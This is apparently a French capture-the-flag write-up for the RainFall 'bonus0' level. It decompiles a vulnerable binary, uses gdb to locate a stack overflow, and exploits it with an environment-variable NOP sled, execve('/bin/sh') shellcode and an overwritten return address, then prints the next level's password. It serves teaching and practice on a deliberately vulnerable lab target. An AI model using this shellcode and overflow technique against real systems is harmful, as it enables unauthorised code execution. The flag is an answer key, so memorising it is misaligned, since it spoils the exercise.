Read also: [./Resources/README.md](./Resources/README.md)

# Source

https://dogbolt.org/?id=e155fda2-581f-4305-ad94-25b044fdefd5

```c
void p(char *param_1,char *param_2)
{
  char *pcVar1;
  char local_100c [4104];
 
  puts(param_2);
  read(0,local_100c,0x1000);
  pcVar1 = strchr(local_100c,10);
  *pcVar1 = '\0';
  strncpy(param_1,local_100c,0x14);
  return;
}

void pp(char *param_1)
{
  char cVar1;
  uint uVar2;
  char *pcVar3;
  byte bVar4;
  char local_34 [20];
  char local_20 [20];
 
  bVar4 = 0;
  p(local_34, " - ");
  p(local_20, " - ");
  strcpy(param_1,local_34);
  uVar2 = 0xffffffff;
  pcVar3 = param_1;
  do {
	if (uVar2 == 0) break;
	uVar2 = uVar2 - 1;
	cVar1 = *pcVar3;
	pcVar3 = pcVar3 + (uint)bVar4 * -2 + 1;
  } while (cVar1 != '\0');
  *(char *)(param_1 + (~uVar2 - 1)) = ' ';
  strcat(param_1,local_20);
  return;
}

int main(void)
{
  char local_3a [54];
 
  pp(local_3a);
  puts(local_3a);
  return 0;
}
```

# Explication

Pour trouver on teste les overflows:

```
(gdb) run
Starting program: /home/user/bonus0/bonus0
 -
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 -
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa��� aaaaaaaaaaaaaaaaaaaa���

Program received signal SIGSEGV, Segmentation fault.
0x61616161 in ?? ()
```

On va utiliser `([cmd1];[cmd2]) | ./bonus0` pour remplir les deux entrées stdin du programme.
(merci: https://stackoverflow.com/a/78919339/)

Après avoir testé plein de chose, j’ai découvert (`info registers`, je ne connaissais pas), on
n’est pas obligé de comprendre tout le code du programme cible avec cette méthode.
(C’est donc un gain de temps énorme).

La première étape va être de faire segfault le programme, une fois que le programme à segfault
on affiche info registers (alas `i r`), $ebp indique la position dans la mémoire du code exécuté
donc on va glisser une adresse dans l’adresse `0xbffff230` qui est le 13eme caractère d’`$ebp`, vu
que le code s'exécute donc le sens inverse du stockage des variables, on écrit du 9eme au 13eme
caractère.

```
(gdb) run < <(python -c 'print("a" * 20)'; python -c 'print("c" + "b" * 20)')
[...]
aaaaaaaaaaaaaaaaaaaacbbbbbbbbbbbbbbbbbbb��� cbbbbbbbbbbbbbbbbbbb���

Program received signal SIGSEGV, Segmentation fault.
0x62626262 in ?? ()
(gdb) i r
eax         0x0 0
ecx         0xffffffff  -1
edx         0xb7fd28b8  -1208145736
ebx         0xb7fd0ff4  -1208152076
esp         0xbffff230  0xbffff230
ebp         0x62626262  0x62626262
esi         0x0 0
edi         0x0 0
eip         0x62626262  0x62626262
eflags      0x210282  [ SF IF RF ID ]
cs          0x73  115
ss          0x7b  123
ds          0x7b  123
es          0x7b  123
fs          0x0 0
gs          0x33  51
(gdb) x/40xb 0xbffff200
0xbffff200: 0x61  0x61  0x61  0x61  0x61  0x61  0x61  0x61
0xbffff208: 0x61  0x61  0x63  0x62  0x62  0x62  0x62  0x62
0xbffff210: 0x62  0x62  0x62  0x62  0x62  0x62  0x62  0x62
0xbffff218: 0x62  0x62  0x62  0x62  0x62  0x62  0xf4  0x0f
0xbffff220: 0xfd  0xb7  0x20  0x63  0x62  0x62  0x62  0x62
            ^^^^    <<<---  13 --->>>
(gdb)
0xbffff228: 0x62  0x62  0x62  0x62  0x62  0x62  0x62  0x62
      vvvv
0xbffff230: 0x62  0x62  0x62  0x62  0x62  0x62  0x62  0xf4
0xbffff238: 0x0f  0xfd  0xb7  0x00  0x58  0xc8  0xfd  0xb7
0xbffff240: 0x00  0x00  0x00  0x00  0x1c  0xf2  0xff  0xbf
0xbffff248: 0xcc  0xf2  0xff  0xbf  0x00  0x00  0x00  0x00
(gdb)
```

Je n’ai pas complémentement fouillé la raison du SEGFAULT mais on semble avoir pourri les registres (créés un décalage)
en écrivant là il ne fallait pas. J’ai essayé de jouer les détective c’est vers là : 

```
(gdb) disas pp
Dump of assembler code for function pp:
[...]
   0x08048582 <+100>: add 0x8(%ebp),%eax
   0x08048585 <+103>: movzwl (%ebx),%edx
   0x08048588 <+106>: mov %dx,(%eax)
   0x0804858b <+109>: lea -0x1c(%ebp),%eax
   0x0804858e <+112>: mov %eax,0x4(%esp)
   0x08048592 <+116>: mov 0x8(%ebp),%eax
   0x08048595 <+119>: mov %eax,(%esp)
```

Dans le code décompilé :

```
void pp(char *param_1) {
  [...]
  do {
    [...]
  } while (cVar1 != '\0');
  *(char *)(param_1 + (~uVar2 - 1)) = ' ';
```

Si je dois donner une raison, mes recherches me font penser que c’est au moment où on ajoute un espace que le registre a été pourri.

DONC pour l’exploit :

**Méthode avec shellcode :**

(On garde le même shellcode que les précédents niveaux https://www.exploit-db.com/exploits/13357, on ne change pas une équipe qui gagne)

```
export ICE=$(python -c 'print "\x90" * 1000 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";')
```

L'adresse de la variable ICE :

```
0xbffffbab:   "ICE=\220\220\220\220
0xbffffbab + 500 = 0xbffffd9f
```
Donc `0xbffffd9f` => `\x9f\xfd\xff\xbf`

```
(gdb) run < <(python -c 'print("a" * 20)'; python -c 'print("c" * 9 + "\x9f\xfd\xff\xbf" + "b" * 7)')
Starting program: /home/user/bonus0/bonus0 < <(python -c 'print("a" * 20)'; python -c 'print("c" * 9 + "\x9f\xfd\xff\xbf" + "b" * 7)')
 -
 -
aaaaaaaaaaaaaaaaaaaaccccccccc����bbbbbbb��� ccccccccc����bbbbbbb���
process 4171 is executing new program: /bin/dash
```

Voila :

```
bonus0@RainFall:~$ (python -c 'print "a" * 20'; python -c 'print "c" * 9 + "\x9f\xfd\xff\xbf" + "b" * 7') | ./bonus0
[...]
aaaaaaaaaaaaaaaaaaaaccccccccc����bbbbbbb��� ccccccccc����bbbbbbb���
$ whoami
bonus1
$ cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```

Le flag est donc : 

```
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```
